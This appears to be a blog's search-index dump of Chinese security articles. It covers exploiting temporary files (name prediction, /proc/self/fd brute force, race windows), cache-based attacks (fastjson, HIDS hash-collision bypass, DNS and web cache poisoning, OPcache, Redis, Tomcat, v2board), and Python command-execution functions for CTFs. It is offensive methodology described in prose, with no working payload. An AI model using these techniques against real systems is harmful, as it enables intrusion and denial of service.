配合 Nginx 等 Web 服务，这些第三方服务在处理文件上传时的临时文件机制基本类似：通常会先将上传内容存储在内存中，当数据量超过一定阈值后，再将其缓存到临时文件中，并在请求处理结束后自动删除这些临时文件。 对于PHP 配合 Nginx 的 Web 服务在php响应数据超过一定阈值时也会产生临时文件，其他服务暂时没有研究过，不知道是否也存在这种情况。 不过，在我研究 Python 相关框架时，发现其实现方式与 Java、PHP 等语言的服务相比还是存在一些差异，且在实际安全利用方面几乎没有可乘之机。由于个人能力有限，尚未完全深入理解其中的细节。 应用本身处理逻辑在一些具有图片上传功能的应用中，通常会先将上传的图片保存到临时目录，然后再对文件进行检测和二次处理（如格式转换、缩略图生成等）。如果检测是在文件落地之后进行的，就可能存在一个条件竞争的时间窗口，攻击者有机会在检测前利用未校验的临时文件发起攻击。实际上，凡是存在文件上传功能的应用，尤其是对文件内容进行二次处理的场景，都有可能存在这种机制。关键在于，应用是否在文件写入磁盘之前就完成了严格的安全检测。 session会话有时，为了保持用户的会话状态，应用会将 session 会话数据进行持久化。这一功能通常由第三方服务或框架实现，且往往需要我们额外配置才能启用。例如，Tomcat 的 CVE-2025-24813 漏洞的利用条件之一，就是开启了基于文件的会话持久化。 相比之下，PHP 的会话管理机制较为特殊。PHP 内置了 session 管理功能，并且在 session.upload_progress.enable 选项开启时（该选项在包括 Docker 在内的大多数环境下默认开启），用户上传文件的信息会被自动保存在 Session 中，而 PHP 的 Session 默认是以文件形式存储的。需要注意的是，这里session 文件在一次请求处理结束后，其内容会被自动清空（session.upload_progress.cleanup选项默认配置为1）。 获取临时文件名要利用临时文件，首先需要知道其存放位置和文件名，这取决于这两者是否可预测。临时目录通常由组件配置文件指定，一般位于系统的临时目录（如 Linux 下的 /tmp），有时也可能随机生成。但本质上，利用方式相同。为简洁起见，后文统一只讨论临时文件名的可预测性。 可以预测当临时文件名的生成规则仅依赖于公开信息（如固定前缀、时间戳、用户可控参数或简单哈希算法）时，临时文件名是可以被预测的。例如，CVE-2023-32697——sqlite jdbc RCE 就是因为临时文件名由下载地址的 hashCode() 计算得出，因此可以提前推算出对应的文件名。再比如，PHP 保存 session 会话数据时，文件名是根据传入的 PHPSESSID 生成的，这也使得文件名具有可预测性。 有时，临时文件名会结合系统特有文件的值和程序自身的特征生成，比如 Flask 的 pin 码计算。这种情况下，攻击者还需借助文件读取漏洞获取相关参数，再按源码逻辑计算出文件名。换句话说，这类场景下临时文件名本身并不可预测，只有结合其他漏洞才能推算出来。 不可以预测信息泄露我们可以通过信息泄露获取临时文件名，这里的信息泄露不仅包括目录遍历，还包括配置文件泄露等。例如，PHP 的 phpinfo 页面会暴露上传文件的保存路径（tmp_name），从而让我们得知临时文件的具体位置。 再比如 Spring Web 框架中的 heapdump 泄漏，由于 Tomcat 生成的临时文件名格式为 /tmp/&#123;tomcat_path&#125;/work/Tomcat/localhost/ROOT/upload_&#123;UID&#125;_&#123;UniqueId&#125;.tmp，其中 UID 是类初始化后固定的随机 UUID，UniqueId 是每次上传时自增的值。通过 heapdump 泄漏，我们可以获取到当前的 UID 和 UniqueId，之后上传文件时只需将 UniqueId 加 1，即可准确预测下一个临时文件名。 有些应用会在日志文件中记录上传文件的临时路径，因此通过读取日志文件也可以获取到临时文件名。 爆破如果没有其他信息泄露，我们只能通过爆破来获取临时文件名。但由于请求处理结束后临时文件会被立即删除，想要在文件被删除前爆破出临时文件名几乎不可能。此时有两种思路： 利用通配符匹配如果目标系统在查找文件路径时支持通配符，我们可以结合临时文件名的特征和通配符来匹配。例如，如果只匹配到我们上传的临时文件，就可以直接利用；如果匹配到多个文件，可能会报错。为此，可以将文件上传和利用合并到同一个请求包中，并根据临时文件名的特征构造通配符，不断尝试，直到只匹配到目标文件。 PHP 在 Windows 下的通配符PHP 读取 Windows 文件时，会用到 FindFirstFileExW 这个 Win32 API，该 API 支持通配符： DOS_STAR（&lt;）：匹配0个以上字符 DOS_QM（&gt;）：匹配1个字符 DOS_DOT（&quot;）：匹配点号 因此，在 Windows 下可以用如 C:\\Windows\\Temp\\php&lt;&lt; 这样的路径来匹配临时文件名中的随机部分（由于Windows内部的一些不太明确的原因，这里一般需要用两个&lt;来匹配多个字符）。 Spring 的通配符Spring 的 ClassPathXmlApplicationContext 类查找路径时也支持通配符，常用的有 * 和 ?，可以用来匹配上传的恶意 XML 文件。 Linux 下的通配符Linux 执行命令时也支持通配符，但既然已经能执行命令，通常就不再需要通过文件上传来利用，这类场景多见于受限的 CTF 环境，实际生产环境中利用价值有限。 借助文件描述符 当进程打开一个文件时，会在 /proc/pid/fd/ 目录下生成对应的文件描述符。如果文件被删除但未关闭，通过文件描述符仍可访问该文件。 pid 的确定是否需要爆破 pid 取决于应用服务器类型： Tomcat：一个 Web 应用通常对应一个进程，可以直接用 /proc/self/fd/..（self 代表当前进程）。 Nginx：一个 Web 应用对应多个进程（1 个 master + 多个 worker），worker 数量一般不超过 CPU 核心数。此时无法确定是哪一个 worker 进程处理了上传请求，需要对 pid 进行爆破。通常需要先通过文件读取漏洞，读取 /proc/pid/cmdline，找出 worker 进程的 pid，再在这些进程中爆破。其实真实环境中如果遇到这种情况就可以直接跑路了。 文件描述符的爆破文件描述符是一个数字，通常可以从 20 枚举到 50，如果应用打开的资源较多，可以适当扩大范围。我们可以先在本地测试一下。 缓冲区溢出这里的情景就是临时文件名储存在了一个变量中，并且在程序运行过程中会输出临时文件名。但是我们需要在请求结束之前获取临时文件名，就可以通过传入一个大数据，使输出缓冲区溢出，提前得到文件名。这个了解即可，打ctf时可以利用一下。技巧来源这道题。 延长临时文件的保存时间因为在请求处理结束之后，临时文件就会被删除，而我们想要在文件被删除之前就进行利用，就需要想方法延长文件留存的时间。 使用同一个请求包这里并不是延长临时文件的留存时间，而是将文件利用和文件上传放在同一个请求包当中，而请求执行完成之后才会删除临时文件。但是这里就有一个要求：我们要能够直接匹配到上传的临时文件，所以这里要么临时文件名可知；要么可以借助通配符做到只匹配到临时文件（具体可以看一下p神的文章）。 使程序运行错误我们要做的，就是在临时文件被删除之前，让程序发生运行错误，从而阻止删除操作的执行，使临时文件得以永久保留。要实现这一点，通常需要我们的输入能够导致目标程序运行异常。然而，这种情况实际上非常罕见，因为大多数开发者都会对输入进行健壮性处理，防止程序因异常输入而崩溃。目前已知的利用方式主要是 PHP 在使用 include 时，结合 php://filter 触发内存错误，导致进程异常退出，不过这个技巧也没有什么实战价值。当然，如果我们有权限修改服务器配置，也可以让临时文件被保留，但这种情况更为少见。 使用http长连接和分块传输这里就是通过延长请求的连接和处理时间来延长临时文件的留存时间。 我们也可以通过给文件增加脏数据和使用ftp来控制文件传输等方式来延长请求时间等，但是这两个方法不具有普遍性。 根据应用服务器处理方式更改数据包格式可以优化为：我们可以从 HTTP 包的特性出发，结合开发者的思维进行分析：如果在请求头中将 Content-Length 设置为一个很大的值，而实际发送的数据远远小于该值，并且客户端不主动断开连接，那么服务器通常会一直等待剩余数据的到来（当然，实际情况还会受到服务器超时机制的影响）。此外，服务器在处理 multipart 请求时，可能会通过 --xxxxxxxx-- 判断整个包是否结束，通过 --xxxxxxxx 判断单个文件上传是否结束。因此，我们可以利用这些特性，构造特定的请求数据包，延长服务器端临时文件的留存时间。实际上，这与 上面HTTP 长连接的思想类似。具体细节可以参考这篇文章。 线程设置在实际利用过程中，我们可以同时设置多个上传文件的线程和多个请求利用的线程（使用大量线程来进行第二个操作），通过大量并发请求，提高利用操作在临时文件被删除前完成的概率，从而提升利用的成功率。 linux中获取文件内容（补充）在Linux中，每个文件都有一个唯一的 inode，它标识文件在文件系统中的位置。文件系统通过目录项将文件路径映射到相应的 inode。inode 表中记录了文件的元数据，包括文件的大小、权限、所有者、修改时间以及数据块的指针。 当我们查找一个文件时，首先通过文件路径找到对应的 inode，然后通过 inode 得到文件的数据块指针，从而访问文件内容。 Linux 支持两种链接：硬链接 和 软链接。 硬链接：硬链接与原始文件共享相同的 inode，所以它们的内容是完全相同的。硬链接是多对一的关系，多个硬链接指向同一个 inode。inode 的引用计数会随着每个硬链接的创建而增加，只有当引用计数为零时，inode 才会被删除。删除一个硬链接只是删除了目录项中路径与 inode 的映射，文件的内容仍然可以通过其他硬链接访问。 软链接：软链接有自己的 inode，并且其 inode 存储的是原始文件的路径，而不是文件内容。当访问软链接时，系统会通过软链接存储的路径来查找原始文件。因此，软链接的 inode 和原始文件的 inode 是不同的。若原始文件被删除或路径无效，软链接会失效，成为“悬挂链接”。 此外，文件系统中的每个文件都有一个 引用计数，表示该文件的硬链接数量。当引用计数为零时，inode 才会被删除。删除硬链接会减少引用计数，但不会立即删除文件内容。只有当所有硬链接和文件描述符都被关闭时，文件的内容才会被真正删除。 在进程打开文件时，内核会为该文件分配一个 文件描述符。文件描述符是一个整数，它在进程的文件描述符表中指向一个文件表项。该文件表项包含文件的 inode 信息以及指向文件数据的指针。可以将文件描述符理解为硬链接中的路径，它允许进程通过文件描述符访问文件内容。即使文件的路径（目录项）被删除，只要文件描述符仍然存在，进程仍然可以通过文件描述符访问文件。 当文件句柄关闭时，文件描述符对应的文件表项会被删除，文件的引用计数减一。如果没有其他进程持有该文件的描述符，inode 和数据块才会被清理。 小结这篇文章具体讲解了临时文件的利用过程，但是我们也可以发现很多技巧在实际环境中很难行得通，我们应该学习的不是各种技巧，这只是一种知识面的扩展而已。我们更应该学习的是漏洞挖掘的思想和解决问题的方法。这里临时文件的产生部分讲的就是漏洞挖掘的方向，从语言本身到中间件再到应用自身逻辑；而获取临时文件名和延长临时文件的保存时间讲的就是方法论的东西，将问题进行拆解，每一个问题又从不同的方向出发。 最后补充几点，一个是fd目录下面的文件描述符随着文件句柄的关闭也会消失，所以这个一般在请求处理结束之后也会消失，不要将他当成延长临时文件留存的一种手段，他更多是充当着一种帮助我们获取临时文件的角色，因为他爆破起来更加容易；另一个是我们的临时目录可能会受到systemd进程的影响导致利用失败（可以看一下参考文章）；最后建议仔细看一下各个参考文章，因为文章视角不同，所以很多细节没有提及。 参考文章 references: 从JDBC MySQL不出网攻击到spring临时文件利用 ClassPathXmlApplicationContext的不出网利用 Postgresql JDBC Attack and Stuff Docker PHP裸文件本地包含综述 无字母数字webshell之提高篇 hxp CTF 2021 - A New Novel LFI Includer 彻底弄懂 Linux 下的文件描述符（fd） HTTP分块传输编码 systemd之PrivateTmp","tags":["临时文件"],"categories":["攻击思路"]},{"title":"利用缓存进行攻击","path":"/2025/06/18/利用缓存进行攻击/","content":"[TOC] 摘要在日常开发设计中，我们经常使用缓存来提高我们程序和服务器运行的效率，但是当程序存在安全问题的时候，缓存很有可能会帮助攻击者绕过我们的防御，这篇文章就是来总结一下缓存的各种利用，学习一下缓存的利用思路。 缓存fastjson中的缓存绕过在fastjson中为了提高json数据反序列化的效率，一个是会将一些经常使用的类缓存起来，还有一个就是会将程序当前运行中反序列化的类缓存起来。如下图： fastjson的这个缓存机制设置得很早。第一个缓存导致了fastjson1.2.47的绕过；第二个缓存则是导致了fastjson1.2.68和fastjson1.2.80的绕过，不过前者主要还是借助的expectClass，缓存并不是关键点。在fastjson中借助缓存机制，我们甚至不需要开启autoType。 在fastjson的早期版本中能够利用缓存进行攻击关键有两点，一个是我们能够控制缓存内容；一个是在使用缓存机制时没有进行黑白名单检查。 对于fastjson中第一个缓存绕过的修复就是不让我们能够修改缓存内容，这个也符合开发的原则，因为一些经常使用的类设计人员已经添加进去，对于我们使用人员来说这个应该是透明的，不应该存在着控制路径；而第二个缓存修复，因为涉及到在运行时的动态添加，不可能一棒子打死，完全不让使用缓存，所以这里是通过添加黑名单检查来避免恶意缓存的添加。 通过上面的案例分析，我们可以知道在进行漏洞挖掘时，如果关键利用被黑白名单或者其他机制所限制，我们可以检查是否有缓存可以利用，然后再观察缓存中的内容是否可控，在对缓存内容进行控制的过程中是否存在安全检查。在观察之前，我们可以先分析是动态缓存还是静态缓存，静态缓存的内容一般不可控。 使用缓存绕过webShell检测这里是参考了p神知识星球的一篇文章。我们先来看p神画的一个示意图，他说明了HIDS（基于主机的入侵检测系统）中，一个Web文件的整个数据轮转过程： 可以看到这里为了缓解资源压力，对于已经检测过的文件，会缓存检测结果，下次就不再检测。所以我们的目标就是将一个恶意文件缓存成一个正常文件。 第一种思路是利用脚本类型的混淆。例如，在一个名为 1.jsp 的文件中写入 PHP webshell，HIDS 会根据文件后缀将其交给 JSP 检测引擎进行分析。由于文件内容并不包含 JSP 代码，检测引擎会认为这是一个正常文件，并根据内容生成哈希数据进行缓存。这样，下次如果上传一个内容相同的 PHP webshell 文件，就可能因为缓存命中而绕过检测机制。 如果开发者意识到这个问题，在计算文件缓存时将文件名也纳入缓存键（如 cache_key = filename + md5(content)），那么仅更换文件后缀将无法命中缓存。此时，可以采用第二种思路——利用哈希碰撞。具体做法是，生成一个正常文件和一个 webshell 文件，使它们的内容哈希值完全相同，并且文件名一致，这样依然可以命中同一个缓存，从而绕过检测。 如何生成两个hash相同的文件？可以参考下这个repo：https://github.com/corkami/collisions。 针对上面第二种思路的绕过，我们其实不要采用md5算法，采用一个更加安全的哈希算法即可。如，SHA-512。 DNS缓存投毒我们知道dns是应用层的服务，是使用来将域名解析为对应的ip地址的，使用域名的目的是为了方便人们记忆。 在使用 DNS 服务时，客户端通常会先向本地域名服务器发起解析请求。如果本地没有缓存记录，服务器会通过递归或迭代的方式，依次向根域名服务器、顶级域名服务器等上级服务器查询，直到获得结果。为提高解析效率，查询到的域名与 IP 映射会被缓存，并设置 TTL（生存时间）以控制缓存的有效期，避免因域名与 IP 关系变化导致解析错误。 DNS缓存投毒是向DNS服务器发送恶意DNS响应，使其缓存错误的解析结果。在缓存有效期内，所有通过被投毒DNS服务器查询该域名的用户都会获得攻击者指定的恶意IP。攻击者可利用此手段引导用户访问钓鱼网站，或将恶意IP设置为内网地址，从而绕过SSRF的黑名单过滤等安全机制，也可以将流量引导到攻击者控制的主机，实现数据窃取，会话劫持。 更高级的攻击则突破了TTL限制：攻击者构造随机子域名（如“12345.example.com”）发起查询，因该子域名不存在于权威服务器，本地DNS服务器需向根服务器迭代查询。此时，攻击者抢先发送伪造响应，将顶级域名“example.com”的NS记录篡改为自身控制的IP。一旦成功，所有对“example.com”的查询都将被重定向，攻击范围呈指数级扩大。 DNS基本没有什么认证机制，这点和缓存机制构成了我们可以实现DNS缓存投毒的核心，这个和上面fastjson其实是一样的。DNS查询响应包仅通过16位事务ID和源端口进行校验，攻击者可通过暴力猜测生成伪造包。若伪造包在合法响应前到达，且事务ID与端口匹配，DNS服务器便会将恶意记录存入缓存。一旦投毒成功，我们攻击范围会变大，可以利用的手段也会得到扩展。 当然，在我看来DNS缓存投毒也存在一定局限性。一方面，如果用户浏览器或操作系统已缓存了域名解析结果，就不会再次向DNS服务器查询，投毒无效；另一方面，TTL到期后缓存失效，攻击效果有限。此外，攻击者还需确保伪造的DNS响应先于合法响应到达目标，否则投毒不会成功。 这种攻击本质上是一种对信任链的破坏，也是一种中间人攻击，在进行渗透测试时，我们应该关注所有信任链，缓存和中间服务的安全性，寻找可被利用的薄弱点。 web缓存投毒Web缓存就是服务器会先将之前没见过的请求对应的响应缓存下来，然后当有认为是相同请求的时候直接将缓存发给用户，这样可以减轻服务器的负荷。但是服务器端在识别的时候是根据特征来的，如果两个请求的特征相同即会认为是相同的请求，此时如果攻击者首先触发服务器缓存附有恶意payload的响应，当其他用户发送相同请求时即会接收到这个恶意的响应。从影响范围来看，一旦成功缓存被投毒的响应，会影响到大量的用户，比起以往某些只能针对某个用户发起的攻击，危害大很多很多。 通常，服务器只会对静态资源进行缓存。但如果服务器和后端对路径的解析方式不一致，也可能导致动态资源被缓存。例如，后端使用通配符 /user/* 处理所有 /user/ 路径下的请求，而服务器则根据文件后缀判断是否为静态资源，如将 /user/content.css 误认为静态文件并进行缓存。 这个问题本身危害有限，通常只会导致 XSS 攻击，因为请求参数一般不会被缓存，缓存特征主要是根据请求行来确定的。我们也可以进行进行其他攻击，例如可以被用于拒绝服务攻击（DoS）：攻击者可以故意发送错误请求，导致服务器返回 400 响应，缓存服务器将该错误响应缓存后，其他用户访问时只能获取到 400 页面，影响正常业务办理。攻击者还可以在缓存即将过期时再次发送错误请求，持续保持错误结果被缓存，从而造成更长时间的业务不可用。 Opcache缓存利用这个也算是php中经典的缓存利用了，在配合文件上传等漏洞会直接导致rce。OPcache（Optimized Cache）本质上是一个 字节码缓存机制，旨在提高 PHP 脚本执行的效率。它通过将 PHP 代码编译成字节码后存储在内存中和缓存在特定目录中（在php.ini中指定），避免了每次请求都需要重新编译 PHP 脚本的过程，从而大大提高了执行效率。 如果存在文件上传的话，我们就可以上传恶意的字节码文件，再访问对应的资源路径。和一般的文件上传相比，一个是我们可以绕过对方对上传目录的限制，一般缓存文件目录和web根目录是不一样的；另一个我们也可以绕过一些路径检测，因为我们访问的就是他真实存在的路径。 利用 OPcache 缓存时需注意两点： 一个是 php.ini 中的 opcache.file_cache_only 通常为 0，此时内存缓存优先，恶意代码难以加载，可尝试让目标服务器重启以清空内存缓存； 另一个是 OPcache 缓存文件路径包含一个 md5 值，该值可通过 phpinfo 信息计算获得，因此还需具备读取 phpinfo 的能力或者能够读取配置文件。 通常，我们通过检查文件的时间戳来防御 OPcache 缓存利用，但这种方法也存在被绕过的风险。如果目标使用了第三方 PHP 服务或框架，往往包含许多长期未变更的文件，攻击者可以轻松获取这些文件的时间戳并进行伪造。这样，就有可能覆盖这些老旧文件的缓存内容，实现恶意代码注入。 CVE-2023-32697——sqlite jdbc RCE这里同样利用了缓存文件机制。通过控制 JDBC，可以远程下载文件并将其缓存到本地指定目录。由于缓存文件名是根据下载地址的 hashCode() 计算得出，因此文件名是可预测的。如果目标存在 SQL 注入漏洞，我们可以先利用 JDBC 下载恶意动态链接库文件到本地缓存，再通过 SQL 注入执行 load_extension 实现 RCE。不过，这种方式需要同时控制 JDBC 配置和 SQL 语句，实际利用难度较高，适用场景有限。 后续的修复措施是将缓存文件名的生成方式从 hashCode() 改为 randomUUID()，使缓存文件名变得不可预测。这提醒我们，在设计文件缓存机制时，应避免使用可预测的命名方式，以防被攻击者利用。对于攻击者来说，文件名不可预测就成为缓存利用时难以绕过的障碍。当然，实际攻击中，很多缓存利用的关键点并不在于机制本身，而在于信息泄露或文件读取等漏洞，正是这些漏洞让攻击者能够获取到缓存路径或文件名，从而实现进一步利用。 redis缓存攻击（CVE-2025-21605）Redis 是一个开源的高性能内存数据存储系统，通常被用作数据库、缓存和消息代理。它支持多种数据结构，包括字符串、哈希、列表、集合、有序集合等。由于 Redis 完全基于内存操作，读写速度非常快，通常用于需要高速访问的应用场景，如实时分析、缓存、会话存储等。 Redis 通常部署在内网，且常以 root 权限运行，并具备写文件能力，因此在内网渗透中是重点关注目标。不过，这类利用方式与我们接下来要讨论的缓存攻击并无直接关联。 Redis 缓存攻击主要体现在 DDoS 相关场景，常见问题包括缓存穿透、缓存击穿和缓存雪崩。 缓存穿透：指缓存和数据库中都没有的数据被频繁请求。由于缓存通常采用被动写入策略，且为避免误缓存不存在的数据，从数据库查不到时不会写入缓存，导致每次请求都要访问数据库，失去了缓存的意义。在高并发或恶意请求下，数据库可能因此被拖垮。 缓存击穿：指某个热点数据在缓存过期后，短时间内有大量并发请求同时访问该数据。由于缓存失效，所有请求都会直接访问数据库，造成数据库压力骤增。 缓存雪崩：指大量缓存数据在同一时间集中过期，导致大量请求直接落到数据库，可能引发数据库宕机。与缓存击穿不同，雪崩是大量不同数据同时失效，而击穿通常是单一热点数据失效。 缓存污染：指程序处理逻辑存在错误，导致数据库中的数据和缓存数据不一致。 这些问题并非 Redis 本身的漏洞，而是所有缓存系统普遍面临的挑战。合理设计缓存策略和防护机制，才能有效应对这些风险。 最近redis还曝出了一个缓存漏洞——CVE-2025-21605。 这个漏洞的根源，在于Redis输出缓冲区管理的设计存在问题。默认情况下，Redis有个叫client-output-buffer-limit的配置，它对普通客户端的输出缓冲区没有设置限制。这就好比给一个容器没有设定容量上限，东西可以无节制地往里装。 在实际运行中，这会导致输出缓冲区持续增大，直至把系统所有的可用内存都消耗殆尽。更要命的是，利用这个漏洞，攻击者根本不需要进行身份验证。哪怕Redis服务器设置了密码保护，攻击者只要发送不包含密码的请求，就能触发漏洞。每次身份验证失败，服务器都会返回“NOAUTH”响应，这些响应会在输出缓冲区不断堆积，越来越多，最后把内存撑爆，导致服务器崩溃或者无法正常提供服务，也就是所谓的拒绝服务（DDoS）。 缓存机制本身能提升系统抗压能力，但只有合理配置和防护，才能真正发挥作用。配置不当或存在设计缺陷时，反而可能被攻击者利用，带来更大的安全隐患。这也为漏洞挖掘提供了新的思路。以往我们更多关注利用缓存机制进行权限或安全绕过，但如果能够确定目标使用了特定的缓存机制，也可以进一步排查是否存在类似 CVE-2025-21605 这样的漏洞，从而实现 DDoS 等攻击。 Tomcat CVE-2024-50379 &#x2F; CVE-2024-56337这两个漏洞本质上是一个漏洞，只是 CVE-2024-50379 没有修复完全，CVE-2024-56337 做了二次修复。这里其实还结合了Tomcat PUT方法任意写文件漏洞（CVE-2017-12615），也就是Tomcat要配置了可写（readonly&#x3D;false），这样我们就可以通过PUT请求方式往服务器写文件。 本来是想要讲解得详细一点的，但是确实是才疏学浅，写得越多反而越乱，写得少很多细节又不能够讲清楚。所以这里还是推荐去看一下先知上面的原理讲解。 看完后，我们可以发现就算对方没有配置readonly=false，但只要存在文件上传漏洞，而且对jsp/jspx等后缀存在检测，我们都可以借助这个方法进行绕过。当然，这里还要求tomcat要部署在对大小写不敏感的操作系统。 整个利用过程其实并不复杂，但每个环节都缺一不可，单独一个点都无法形成漏洞利用。AI 很难自动发现这种漏洞。人工挖掘时，往往只能从某个细节入手，比如发现配置了 readonly=false，但修复后无法上传 jsp 文件，于是尝试用大小写绕过（如 Jsp），但发现 Jsp 也不会被解析。接下来就需要深入分析 Tomcat 对请求路径的处理流程，逐步排查和验证，看是否可以让Jsp也能够被解析。整个过程不仅考验分析能力和知识广度，也需要很强的耐心和心理承受力。很多时候，距离成功可能只差一步，也可能最终无法利用。 临时文件的利用这一部分内容较多，后续我会单独写一篇文章详细介绍，这里先做简单说明。 在缓存机制中，很多场景会使用临时文件来存储中间数据或交换数据。通常情况下，当缓冲区无法容纳全部数据时，程序会将部分数据写入临时文件。请求处理结束后，这些临时文件一般会被删除。 临时文件利用有三个关键要点： 文件内容是否可控。 临时文件目录和文件名是否可知或可预测。 文件被彻底删除前是否可利用。 针对临时文件的利用方式主要有两种： 一种是直接写入 WebShell，然后通过访问或文件包含等方式执行恶意代码。 另一种是写入辅助文件，供后续其他 payload 利用，尤其在目标环境无法出网时，这种方式可以实现更灵活的攻击链。 临时文件通常存储在临时目录中，并且在落地后很快就会被删除，因此防御者往往容易忽视相关风险。在 CTF 比赛中，临时文件的利用是常见的考点，但在实际环境中，想要成功利用临时文件往往需要发送大数据包以触发临时文件的生成，随后还可能需要通过条件竞争来利用这些文件。在此过程中，还可能涉及对临时文件目录和文件名的爆破。由于整个利用链条较长，容易产生异常流量或操作，从而被目标系统的安全检测机制发现。 缓存机制导致的权限提升在开源机场管理平台 v2board 1.6.1 中存在一个提权漏洞。该版本引入了缓存机制：用户访问时，当前的 Authorization 头会被保存到 Redis 缓存中。后续请求如果携带的 Authorization 头在缓存中存在，则直接被认为是合法用户。然而，前台 API 和后台 API 共用了这一缓存机制，并且缓存的 key 相同。此外，后台 API 在读取缓存后，并未校验该缓存对应的用户是否具有管理员权限，最终导致普通用户可以通过构造请求实现权限提升。 小结我们可以看到，缓存机制在为我们带来便利的同时，也引入了一些安全隐患。开发人员往往默认信任被缓存的数据，而这些数据在后续可能会被其他功能或模块访问。虽然大多数情况下这不会直接导致明显的安全问题，但如果与其他漏洞结合利用，就可能引发严重后果。因此，这类安全问题往往不易被发现。 利用缓存机制的漏洞通常需要通过代码审计才能识别。首先，需要判断系统采用的是静态缓存还是动态缓存。动态缓存意味着用户有机会控制缓存内容，这会带来更高的风险。接下来，要检查缓存写入时是否对数据进行了充分的校验，尤其是在涉及权限、身份等敏感信息的场景。还要关注其他读取缓存数据的地方，分析是否存在信任缺失或权限绕过等问题。例如，前文提到的 v2board 漏洞，就是因为默认信任缓存数据，未对取出的数据进行权限校验，最终导致权限提升。这类审计对开发和安全人员的整体素养要求较高。 缓存相关的安全问题有大有小，在真实环境中往往较难利用，尤其是在黑盒测试场景下，我们通常只能针对开源组件进行代码审计，寻找潜在漏洞。实际案例中，利用较多的是 Web 缓存投毒导致的敏感信息泄露或拒绝服务攻击，而像通过缓存临时文件进行利用的情况，在真实生产环境下则相对罕见。 参考文章","tags":["缓存"],"categories":["攻击思路"]},{"title":"python中的命令执行函数","path":"/2025/02/02/python中的命令执行函数/","content":"[TOC] 摘要在ctf有关python的题目中，ssti注入，沙箱逃逸，pickle反序列化等往往会涉及到命令执行，所以这里我们写一篇文章来记录一下各类命令执行函数的使用。 命令执行os模块system函数是使用c语言实现的一个函数，底层调用的是c语言中的system函数，而且这个函数并不在。比较有趣的一点就是在windows上面python3.9版本中，我在os.py文件中没有找到system函数的定义，反而在nt.py文件中找到了定义。但是实际调用的时候还是通过os.system来调用。 在执行结束后，会在控制台中打印出执行结果。因为返回值不是命令执行的结果，所以在使用system函数的时候要进行外带或者反弹等。 popen函数我们看一下源代码： 1234567891011121314151617181920def popen(cmd, mode=&quot;r&quot;, buffering=-1): if not isinstance(cmd, str): raise TypeError(&quot;invalid cmd type (%s, expected string)&quot; % type(cmd)) if mode not in (&quot;r&quot;, &quot;w&quot;): raise ValueError(&quot;invalid mode %r&quot; % mode) if buffering == 0 or buffering is None: raise ValueError(&quot;popen() does not support unbuffered streams&quot;) import subprocess if mode == &quot;r&quot;: proc = subprocess.Popen(cmd, shell=True, text=True, stdout=subprocess.PIPE, bufsize=buffering) return _wrap_close(proc.stdout, proc) else: proc = subprocess.Popen(cmd, shell=True, text=True, stdin=subprocess.PIPE, bufsize=buffering) return _wrap_close(proc.stdin, proc) 可以看到popen函数本质上是调用了subprocess.Popen类的构造方法，popen函数给人们提供了更加简便的调用接口，如果需要更加精细的操作，就可以直接使用subprocess.Popen类。 最后返回一个 _wrap_close对象，这个对象包装了一个流对象和一个子进程对象，其中的流对象中就包含了我们命令执行的结果，可以理解为一个文件对象。_wrap_close对象实现了一个方法： 12def __getattr__(self, name): return getattr(self._stream, name) 这个方法就是将未定义的属性委托给流对象，所以我们在使用popen函数执行命令的时候，最后os.popen().reand就是在调用流对象中的read()方法，最终我们就得到了我们命令执行的结果。但是最后的执行结果并不会在控制台中打印出来。 这里的cmd参数只能接收字符串类型，而且cmd参数是在子进程中传递给shell执行的，所以如果存在和系统平台冲突的特殊字符，这里要进行转义。 execlp用于执行一个可执行文件，并用新的进程替换当前进程。这个函数调到最后其实调用的是execvp。这个过程涉及到很多其他函数，我们都可以使用这些函数来执行命令，这里不一一列举了，感兴趣的可以去看一下文档和源码。 这个函数接受一个执行文件名和传递给该可执行文件的参数，如： 123os.execlp(&#x27;whoami&#x27;,&#x27;whoami&#x27;)os.execlp(&#x27;ls&#x27;,&#x27;ls&#x27;,&#x27;-l&#x27;)//这里至少要传递两个参数，否则会报错，这里传递的可执行文件我们也可以使用绝对路径 这个函数没有返回值，而且使用这个函数会影响到当前进程，我在shell中测试的时候，直接从python进程当中退出了。 nt模块或者posix模块我们前面不是说了吗，在windows上面system函数其实是定义在nt.py文件中的。而在unix中，system函数其实是定义在posix.py文件中的。这里是使用了分层设计的思想，当我们安装python的时候，在不同的操作系统，底层模块之间也是存在差异的，os模块封装了不同操作系统的底层差异，给我们提供了一个统一的使用接口，提高了程序的兼容性。 如果不考虑兼容性，我们也是可以直接通过nt.system或者posix.system来执行命令的。 subprocess模块Popen类这个本质上调用的是这个类的构造函数来执行命令，包含的参数非常多，这里只简单介绍两个。 一个是args，一个是shell。args传递的就是我们要执行的命令，这个参数可以是字符串，也可以是序列（元组或者列表）。shell参数是一个布尔类型。当args是字符串的时候，这个时候shell参数一定要是True，默认是False。 推荐是使用序列的形式，因为这样可以防止shell注入，提前发现问题，如果是字符串形式的话还需要进行转义。 我们这里举两个具体的例子： 因为我们这里是使用的Popen类的构造函数，所以最后返回的是一个Popen对象。同时运行这个函数会将命令执行结果打印在控制台。但是如果我们想要读取命令执行的结果，我们还需要设置两个参数。 1234567891011121314151617181920212223import subprocess# 要执行的命令command = [&quot;whoami&quot;]# 创建子进程process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)# 读取标准输出和标准错误stdout, stderr = process.communicate()# 获取命令的退出状态码returncode = process.returncode# 打印结果print(&quot;Standard Output:&quot;)print(stdout)print(&quot;Standard Error:&quot;)print(stderr)print(&quot;Return Code:&quot;)print(returncode) PIPE表示打开的标准流通道，用于两个进程之间进行通信，而text是用来设置是否将输入和输出进行文本编转换的。更多详细信息可以看一下文档。 run函数源码比较长，这里就不放出来了。这里底层调用的还是Popen类的构造函数。 和Popen类的构造函数相比，这里多了四个参数，直接看下面文档截图。 所以我们调用run函数是这样subprocess.run(&#39;whoami&#39;，capture_output=True, text=True)。 但是返回的对象不也一样，run函数返回的对象是CompletedProcess，这个对象有stdout和stderr属性，所以我们可以直接获取，而不是调用communicate()方法，这个对象本身也没有communicate()方法。 call函数看一下源代码： 123456789101112131415def call(*popenargs, timeout=None, **kwargs): &quot;&quot;&quot;Run command with arguments. Wait for command to complete or timeout, then return the returncode attribute. The arguments are the same as for the Popen constructor. Example: retcode = call([&quot;ls&quot;, &quot;-l&quot;]) &quot;&quot;&quot; with Popen(*popenargs, **kwargs) as p: try: return p.wait(timeout=timeout) except: # Including KeyboardInterrupt, wait handled that. p.kill() # We don&#x27;t call p.wait() again as p.__exit__ does that for us. raise 